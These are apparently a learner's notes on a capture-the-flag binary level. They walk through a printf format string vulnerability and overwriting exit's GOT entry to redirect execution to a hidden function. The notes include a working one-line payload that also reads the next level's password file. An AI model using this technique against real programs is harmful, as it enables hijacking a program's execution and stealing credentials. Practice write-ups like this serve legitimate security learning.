- executable mimick stdin
- we see fget not exploitable
- we see printf maybe exploitable
- we see a buffer that's bigger than what fgets reads
- we see o() which is a lead
- maybe we want to call o() from n()
- o() address is (0x080484a4)
- I need to try and change the return address of something to point to o()
- "I did some research" -> PLT & GOT exploit
- I figure that I need to rewrite the PLT value of where exit jumps to (the GOT)
- Craft a payload consisting of:
- Adress of exit (plt) (with disas exit) + adress of o() padded - 4 to account for the first byte of the payload + format string to store the padding into a pointer, shifted to 4 since 4 is  the 4th argument (found with print("a %x %x %x %x %x")) 
- get the flag 

Payload:
(python -c 'print("\x08\x04\x98\x38"[::-1] + "%134513824p" + "%4$n")' && echo 'cat /home/user/level6/.pass') | ./level5

Dogbolt:
https://dogbolt.org/?id=ba35d828-02dc-44ac-a188-182a91119498

PTL/GOT:
https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got

"Linkers":
https://www.airs.com/blog/archives/38
